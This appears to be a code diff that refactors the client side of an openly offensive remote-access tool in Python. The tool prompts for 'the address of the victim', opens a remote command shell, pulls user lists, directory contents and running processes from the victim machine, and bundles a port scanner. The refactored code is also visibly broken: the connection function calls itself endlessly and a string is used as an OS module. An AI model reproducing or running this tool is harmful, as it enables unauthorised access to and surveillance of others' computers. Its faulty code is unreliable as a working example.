@@ -17,7 +17,6 @@ class Shell:
 
     def receive(self):
         content = s.recv(4096).decode("utf-8", errors="ignore")
-        # error when nothing
         if content[2:] == "cd":
             malware_os.chdir(self._command[3:].decode("utf-8", errors="ignore"))
         print(content)
@@ -95,94 +94,118 @@ class PortScanner:
         print("[*] Scanning completed in {}".format(final_time))
 
 
-parser = argparse.ArgumentParser()
-parser.add_argument("-a", "--address", type=str, help="Enter the IP address to connect to")
-parser.add_argument("-p", "--portscanner", action="store_true", help="Specify option to only start the port scanner")
-args = parser.parse_args()
-address_option = args.address
-portscanner_ip = args.portscanner
-
-if not portscanner_ip:
-    pass
-else:
-    port_scanner = PortScanner()
-    port_scanner.scanner()
-    sys.exit(0)
-
-if address_option is None:
-    malware_addr = input("[*] Enter the address of the victim: ")
-    if not malware_addr:
-        print("[!] You must enter an IP!")
-        attempts = 1
-        while not malware_addr:
-            malware_addr = input("[*] Enter the address of the victim: ")
-            attempts += 1
-            if attempts == 3:
-                print("[!] To many blank attempts. Shutting down program.")
-                sys.exit(0)
-else:
-    malware_addr = address_option
-
-serv_addr = (malware_addr, 12345)
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-try:
-    s.connect(serv_addr)
-except socket.error:
-    print("[!] Unable to connect to the following address: {}".format(malware_addr))
-    sys.exit(0)
-print(s.recv(4096).decode('utf-8', errors="ignore"))
-s.send("os".encode("utf-8"))
-malware_os = s.recv(4096).decode('utf-8', errors="ignore")
-
-getinfo = GetInfo(malware_os)
-shell = Shell()
-
-print("----------------")
-message = input(
-    "1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Press 3 to start a "
-    "Port Scanner.\n4. Type exit to quit\n\nAnswer: ")
-print("\n----------------------------------------")
-
-while message != "exit":
-    if message == "1":
-        shell.set_next_command(True)
-        while shell.get_next_command():
-            shell._command = input("Shell: ")
-            while shell.get_command() == "":
-                shell.set_command(input("Shell: "))
-            if shell.get_command() == "exit":
-                shell.close()
-            if shell.get_command() == "history":
-                shell.history()
-            else:
-                shell.send()
-                shell.receive()
-    elif message == "2":
-        print("[*] List of Users")
-        shell.set_command(getinfo.get_users())
-        shell.send()
-        shell.receive()
-        print("----------------------------------------")
-        print("[*] Directory Content")
-        shell.set_command(getinfo.get_content())
-        shell.send()
-        shell.receive()
-        print("----------------------------------------")
-        print("[*] list Running Process")
-        shell.set_command(getinfo.list_process())
-        shell.send()
-        shell.receive()
-        shell.set_command("")
+def set_up_parser():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-a", "--address", type=str, help="Enter the IP address to connect to")
+    parser.add_argument("-p", "--portscanner", action="store_true",
+                        help="Specify option to only start the port scanner")
+    args = parser.parse_args()
+    address_option = args.address
+    portscanner_ip = args.portscanner
+    start_portscanner(portscanner_ip)
+    return address_option, portscanner_ip
 
 
-    elif message == "3":
-        scan = PortScanner()
-        scan.scanner()
+def get_malware_address(address_option):
+    if address_option is None:
+        malware_addr = input("[*] Enter the address of the victim: ")
+        if not malware_addr:
+            print("[!] You must enter an IP!")
+            attempts = 1
+            while not malware_addr:
+                malware_addr = input("[*] Enter the address of the victim: ")
+                attempts += 1
+                if attempts == 3:
+                    print("[!] To many blank attempts. Shutting down program.")
+                    sys.exit(0)
+    else:
+        malware_addr = address_option
+    return malware_addr
 
-    print("\n----------------------------------------")
+
+def start_portscanner(portscanner_ip):
+    if not portscanner_ip:
+        pass
+    else:
+        port_scanner = PortScanner()
+        port_scanner.scanner()
+        sys.exit(0)
+
+
+def connection(malware_addr):
+    global s
+    serv_addr = (malware_addr, 12345)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        s.connect(serv_addr)
+    except socket.error:
+        print("[!] Unable to connect to the following address: {}".format(malware_addr))
+        sys.exit(0)
+    print(s.recv(4096).decode('utf-8', errors="ignore"))
+    connection(malware_addr)
+
+
+def run_commands(malware_os):
+    getinfo = GetInfo(malware_os)
+    shell = Shell()
+    print("----------------")
     message = input(
         "1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Press 3 to start a "
         "Port Scanner.\n4. Type exit to quit\n\nAnswer: ")
+    print("\n----------------------------------------")
+    while message != "exit":
+        if message == "1":
+            shell.set_next_command(True)
+            while shell.get_next_command():
+                shell._command = input("Shell: ")
+                while shell.get_command() == "":
+                    shell.set_command(input("Shell: "))
+                if shell.get_command() == "exit":
+                    shell.close()
+                if shell.get_command() == "history":
+                    shell.history()
+                else:
+                    shell.send()
+                    shell.receive()
+        elif message == "2":
+            print("[*] List of Users")
+            shell.set_command(getinfo.get_users())
+            shell.send()
+            shell.receive()
+            print("----------------------------------------")
+            print("[*] Directory Content")
+            shell.set_command(getinfo.get_content())
+            shell.send()
+            shell.receive()
+            print("----------------------------------------")
+            print("[*] list Running Process")
+            shell.set_command(getinfo.list_process())
+            shell.send()
+            shell.receive()
+            shell.set_command("")
 
-s.close()
+
+        elif message == "3":
+            scan = PortScanner()
+            scan.scanner()
+
+        print("\n----------------------------------------")
+        message = input(
+            "1. Press 1 to start a Shell\n2. Press 2 to retrieve information of the victim\n3. Press 3 to start a "
+            "Port Scanner.\n4. Type exit to quit\n\nAnswer: ")
+
+
+def main():
+    global s, malware_os
+    parser_options = set_up_parser()
+    malware_addr = get_malware_address(parser_options[0])
+    start_portscanner(parser_options[1])
+    connection(malware_addr)
+    s.send("os".encode("utf-8"))
+    malware_os = s.recv(4096).decode('utf-8', errors="ignore")
+    run_commands(malware_os)
+    s.close()
+
+
+if __name__ == "__main__":
+    main()
